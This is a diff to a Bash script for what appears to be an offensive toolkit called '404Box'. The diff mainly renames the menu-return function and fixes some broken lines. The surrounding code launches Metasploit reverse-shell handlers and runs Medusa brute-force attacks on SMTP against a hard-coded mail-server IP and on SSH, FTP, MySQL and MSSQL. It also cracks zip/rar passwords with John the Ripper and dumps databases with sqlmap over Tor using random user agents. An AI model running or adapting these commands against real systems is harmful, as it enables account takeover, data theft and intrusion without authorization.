@@ -45,6 +45,28 @@ fi
 
 }
 
+back_module_t() {
+
+echo -e $cyan
+
+read -p "Do you need to back to main menu? [Y/n]:> " back
+
+if [ $back == "Y" ] || [ $back == "y" ]; then
+
+main_module_t
+
+elif [ $back == "N" ] || [ $back == "n" ]; then
+
+clear && echo -e $green"[${red}<3$green] ${cyan}Happy Hacking Day :D\n" && exit
+
+else
+
+echo -e $green"\n[${red}!$green] ${red}Command Invalid...\n" && sleep 0.5 && back_module_t
+
+fi
+
+}
+
 main_module() {
 
 clear && toilet -F border 404Box | lolcat && echo
@@ -161,7 +183,7 @@ echo -e $red"JoMo-Kun / Foofus Networks $green[${red}Medusa Tools$green]"
 echo -e $red"Rapid7 $green[${red}Metasploit$green]"
 echo -e $red"Openwall $green[${red}JohnTheRipper$green]\n" 
 
-back_module
+back_module_t
 
 elif [ $opt == "99" ]; then 
 
@@ -319,7 +341,7 @@ echo -e $green"[$red+$green]$yellow Longitude : ${green}$longitude"
 echo -e $green"[$red+$green]$yellow Timezone : ${green}$timezone"
 echo -e $green"[$red+$green]$yellow ISP : ${green}$isp"
 
-echo && back_module
+echo && back_module_t
 
 }
 
@@ -559,7 +581,7 @@ echo -e "$success ${cyan}LHOST : $lhost"
 echo -e "$success ${cyan}LPORT : $lport"
 echo -e $green"#=============================================#\n"
 
-msfconsole -x "use exploit/multi/handler; set payload $payload; set lhost $lhost; set lport $lport; clear; exploit -z; exit;" && back_module
+msfconsole -x "use exploit/multi/handler; set payload $payload; set lhost $lhost; set lport $lport; clear; exploit -z; exit;" && back_module_t
 
 elif [ $mopt == "W" ] || [ $mopt == "w" ] || [ $mopt == "windows" ] || [ $mopt == "Windows" ]; then
 
@@ -587,7 +609,7 @@ echo -e "$success ${cyan}LPORT : $lport"
 echo -e "$success ${cyan}ReverseListerner : $reverse"
 echo -e $green"#=============================================#\n"
 
-msfconsole -x "use exploit/multi/handler; set payload $payload; set lhost $lhost; set lport $lport; set ReverseListernerBindAddress 127.0.0.1; clear; exploit -z; exit;" && back_module
+msfconsole -x "use exploit/multi/handler; set payload $payload; set lhost $lhost; set lport $lport; set ReverseListernerBindAddress 127.0.0.1; clear; exploit -z; exit;" && back_module_t
 
 elif [ $reverse == "n" ] || [ $reverse == "N" ]; then
 
@@ -600,7 +622,7 @@ echo -e "$success ${cyan}LPORT : $lport"
 echo -e "$success ${cyan}ReverseListerner : $reverse"
 echo -e $green"#=============================================#\n"
 
-msfconsole -x "use exploit/multi/handler; set payload $payload; set lhost $lhost; set lport $lport; clear; exploit -z; exit;" && back_module
+msfconsole -x "use exploit/multi/handler; set payload $payload; set lhost $lhost; set lport $lport; clear; exploit -z; exit;" && back_module_t
 
 else
 
@@ -766,7 +788,7 @@ echo -e $cyan
 
 cd /root/404Box && mkdir modules && git clone https://github.com/$author/$repo /$HOME/404Box/modules/$output
 
-sleep 0.5 && back_module
+sleep 0.5 && back_module_t
 
 }
 
@@ -850,27 +872,27 @@ sleep 0.5
 
 if [ $char == "upper" ] || [ $char == "Upper" ]; then
 
-echo -e $green && clear && crunch $min $max $upper -o $output && clear
+echo -e $green && clear && crunch $min $max $upper -o $output && clear && back_module_t
 
 elif [ $char == "lower" ] || [ $char == "lower" ]; then
 
-echo -e $green && clear && crunch $min $max $lower -o $output && clear
+echo -e $green && clear && crunch $min $max $lower -o $output && clear && back_module_t
 
 elif [ $char == "number" ] || [ $char == "Number" ]; then
 
-echo -e $green && clear && crunch $min $max $number -o $output && clear
+echo -e $green && clear && crunch $min $max $number -o $output && clear && back_module_t
 
 elif [ $char == "sym" ] || [ $char == "Sym" ] || [ $char == "symbols" ] || [ $char == "Symbols" ]; then
 
-echo -e $green && clear && crunch $min $max $sym -o $output && clear
+echo -e $green && clear && crunch $min $max $sym -o $output && clear && back_module_t
 
 elif [ $char == "mix" ] || [ $char == "Mix" ]; then
 
-echo -e $green && clear && crunch $min $max $mix -o $output && clear
+echo -e $green && clear && crunch $min $max $mix -o $output && clear && back_module_t
 
 else
 
-echo -e $green && clear && crunch $min $max $char -o $output && clear
+echo -e $green && clear && crunch $min $max $char -o $output && clear && back_module_t
 
 fi
 
@@ -940,7 +962,7 @@ if [ $correct == "Y" ] || [ $correct == "y" ]; then
 
 medusa -h 74.125.200.109 -u $email -P $path -M smtp -F -b | grep -E "ACCOUNT FOUND"
 
-echo && back_module
+echo && back_module_t
 
 elif [ $correct == "N" ] || [ $correct == "n" ]; then
 
@@ -984,7 +1006,7 @@ if [ $correct == "Y" ] || [ $correct == "y" ]; then
 
 medusa -h $ip -u $email -P $path -M ssh -F -b | grep -P "ACCOUNT FOUND"
 
-echo && back_module
+echo && back_module_t
 
 elif [ $correct == "N" ] || [ $correct == "n" ]; then
 
@@ -1070,7 +1092,7 @@ if [ $correct == "Y" ] || [ $correct == "y" ]; then
 
 medusa -h $ip -u $email -P $path -M ftp -F -b | grep -P "ACCOUNT FOUND"
 
-echo && back_module
+echo && back_module_t
 
 elif [ $correct == "N" ] || [ $correct == "n" ]; then
 
@@ -1303,15 +1325,15 @@ if [ $correct == "Y" ] || [ $correct == "y" ]; then
 
 medusa -h $ip -u $email -P $path -M mysql -F -b | grep -P "ACCOUNT FOUND"
 
-echo && back_module
+echo && back_module_t
 
 elif [ $correct == "N" ] || [ $correct == "n" ]; then
 
-sleep 0.5 && ssh_module
+sleep 0.5 && mysql_module_t
 
 else
 
-sleep 0.5 && ssh_module
+sleep 0.5 && mysql_module_t
 
 fi
 
@@ -1346,15 +1368,15 @@ if [ $correct == "Y" ] || [ $correct == "y" ]; then
 
 medusa -h $ip -u $email -P $path -M mssql -F -b | grep -P "ACCOUNT FOUND"
 
-echo && back_module
+echo && back_module_t
 
 elif [ $correct == "N" ] || [ $correct == "n" ]; then
 
-sleep 0.5 && ssh_module
+sleep 0.5 && mssql_module_t
 
 else
 
-sleep 0.5 && ssh_module
+sleep 0.5 && mssql_module_t
 
 fi
 
@@ -1378,7 +1400,7 @@ sleep 0.5
 
 john --format=zip --wordlist=$path $file
 
-echo && back_module
+echo && back_module_t
 
 }
 
@@ -1400,7 +1422,7 @@ sleep 0.5
 
 john --format=rar --wordlist=$path $file
 
-echo && back_module
+echo && back_module_t
 
 }
 
@@ -1454,15 +1476,15 @@ clear && toilet -F border TABLES && echo -e $cyan && sqlmap -u $site --batch -D 
 echo -e $green
 read -p "Columns:> " columns
 clear && toilet -F border COLUMNS && echo -e $cyan && sqlmap -u $site --batch -D $table -T $columns --columns --output-dir=/root/404Box/output/ --tor --random-agent | grep "resumed: '"
-e
-cho -e $cyan
+
+echo -e $cyan
 if [ $dump == "Y" ] || [ $dump == "y" ]; then
 
 clear && toilet -F border DUMP && echo -e $cyan && sqlmap -u $site --batch -D $table -T $columns --dump --output-dir=/root/404Box/output/ --tor --random-agent | grep "retrieved: '" && echo && back_module
 
 else
 
-back_module
+back_module_t
 
 fi
 
